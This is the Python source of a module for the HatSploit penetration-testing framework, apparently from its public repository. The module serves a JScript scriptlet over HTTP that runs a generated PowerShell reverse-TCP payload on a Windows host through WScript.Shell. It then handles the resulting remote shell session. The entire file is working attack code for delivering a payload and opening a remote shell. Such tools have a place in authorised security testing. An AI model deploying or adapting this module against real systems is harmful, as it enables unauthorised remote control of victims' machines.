#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.module import Module
from hatsploit.lib.server import Server

from hatsploit.utils.payload import PayloadTools
from hatsploit.utils.handler import Handler


class HatSploitModule(Module, PayloadTools, Handler):
    server = Server()

    details = {
        'Name': "Windows bitsadmin.exe Reverse HTTP Handler",
        'Module': "exploit/windows/handler/bitsadmin_reverse_http",
        'Authors': [
            'Ivan Nikolsky (enty8080) - module developer'
        ],
        'Description': "Windows bitsadmin.exe reverse HTTP handler.",
        'Platform': "windows",
        'Rank': "high"
    }

    payload = {
        'Value': "windows/generic/powershell_reverse_tcp",
        'Categories': None,
        'Architectures': None,
        'Platforms': [
            'windows'
        ],
        'Types': None,
        'Handler': 'reverse_tcp'
    }

    options = {
        'SRVHOST': {
            'Description': "Local host to start HTTP server on.",
            'Value': "0.0.0.0",
            'Type': "ip",
            'Required': True
        },
        'SRVPORT': {
            'Description': "Local port to start HTTP server on.",
            'Value': 8080,
            'Type': "port",
            'Required': True
        },
        'URLPATH': {
            'Description': "File path on server.",
            'Value': "/",
            'Type': None,
            'Required': True
        }
    }

    def serve_bitsadmin(self, server_host, server_port, url_path):
        payload = self.generate_payload(
            "windows/generic/powershell_reverse_tcp", {
                'RHOST': self.handler['RHOST'],
                'RPORT': self.handler['RPORT']
            }
        )

        payload = (
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
            "<job id=\"0\">"
            "    <script language=\"JScript\">"
            "        <![CDATA["
            f"            new ActiveXObject(\"WScript.Shell\").Run(\"{payload}\");\n"
            "        ]]>"
            "    </script>"
            "</job>"
        )

        self.server.start_server(
            server_host,
            server_port,
            payload,
            path=url_path
        )

    def run(self):
        server_host, server_port, url_path = self.parse_options(self.options)
        self.serve_bitsadmin(server_host, server_port, url_path)

        remote = self.module_handle_session(
            payload_type=self.payload['Handler']
        )

        if remote:
            self.module_handle(
                sender=remote[0].send_command
            )
            remote[0].close()
